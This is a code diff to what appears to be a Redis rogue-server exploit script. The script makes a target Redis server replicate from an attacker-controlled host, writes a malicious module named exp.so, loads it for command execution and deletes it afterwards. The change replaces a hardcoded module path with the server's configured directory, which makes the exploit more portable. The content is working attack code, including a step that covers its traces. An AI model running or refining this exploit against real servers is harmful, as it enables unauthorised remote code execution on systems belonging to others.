@@ -116,11 +116,12 @@ def runserver(rhost, rport, lhost, lport):
     remote = Remote(rhost, rport)
     remote.do(f"SLAVEOF {lhost} {lport}")
     remote.do("CONFIG SET dbfilename exp.so")
+    path = remote.do("CONFIG GET dir").split(CLRF)[-2]
     sleep(2)
     rogue = RogueServer(lhost, lport)
     rogue.exp()
     sleep(2)
-    remote.do("MODULE LOAD /var/lib/redis/exp.so")
+    remote.do("MODULE LOAD {}/exp.so".format(path))
     remote.do("SLAVEOF NO ONE")
 
     # Operations here
@@ -128,7 +129,7 @@ def runserver(rhost, rport, lhost, lport):
 
     # clean up
     remote.do("CONFIG SET dbfilename dump.rdb")
-    remote.shell_cmd("rm /var/lib/redis/exp.so")
+    remote.shell_cmd("rm {}/exp.so".format(path))
     remote.do("MODULE UNLOAD system")
 
 if __name__ == '__main__':
